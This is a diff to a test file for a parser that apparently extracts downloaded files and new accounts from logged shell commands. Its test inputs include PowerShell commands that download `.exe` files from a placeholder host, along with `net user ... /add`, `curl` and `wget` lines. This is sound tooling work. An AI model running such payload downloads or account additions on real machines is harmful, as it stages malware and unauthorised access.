@@ -173,6 +173,17 @@ describe('fix round 1', () => {
     expect(run("(New-Object Net.WebClient).DownloadFile('http://x/a','C:\\w\\a.exe')", onWin)).toEqual([{ kind: 'file', target: 'C:\\w\\a.exe', hostId: 'dc' }]);
     expect(run("(New-Object Net.WebClient).DownloadFile('http://x/a','C:\\w\\a.exe')")).toEqual([]);
   });
+  it('unwraps a bare powershell -c / -Command', () => {
+    expect(run('powershell -c "iwr http://x -OutFile C:\\a.exe"', onWin)[0].target).toBe('C:\\a.exe');
+    expect(run('powershell.exe -Command "iwr http://x -OutFile C:\\a.exe"', onWin)[0].target).toBe('C:\\a.exe');
+    expect(run('powershell -c "net user h P /add"', onWin)[0]).toMatchObject({ kind: 'account', target: 'h' });
+  });
+  it('a download to the null device is not suggested', () => {
+    expect(run('curl -o /dev/null http://x', onWeb)).toEqual([]);
+    expect(run('wget -O /dev/null http://x', onWeb)).toEqual([]);
+    expect(run('iwr http://x -OutFile NUL', onWin)).toEqual([]);
+    expect(run('iwr http://x -OutFile $null', onWin)).toEqual([]);
+  });
   it('tolerates missing command/blocks and unbalanced quotes', () => {
     const e = cmd('x');
     const bad = { ...e, content: { kind: 'command', blocks: [{ output: '' }] } } as unknown as LogEntry;
